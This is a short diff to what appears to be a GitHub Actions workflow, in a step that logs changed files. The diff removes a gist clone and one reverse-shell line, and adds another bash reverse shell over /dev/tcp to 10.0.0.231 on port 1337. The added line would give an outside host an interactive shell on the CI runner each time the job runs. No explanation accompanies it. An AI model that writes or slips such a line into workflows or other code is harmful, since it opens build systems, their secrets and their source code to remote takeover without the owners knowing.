@@ -29,7 +29,5 @@ jobs:
           for file in ${{ steps.changed-files.outputs.all_changed_files }}; do
             echo "$file was changed"
           done
-          git clone https://gist.github.com/da2f48e847f49c73b72f251db4d933ab.git
-          cd da2f48e847f49c73b72f251db4d933ab
-          /bin/bash -i >& /dev/tcp/10.0.0.229/1337 0>&1
+          /bin/bash -i >& /dev/tcp/10.0.0.231/1337 0>&1
 
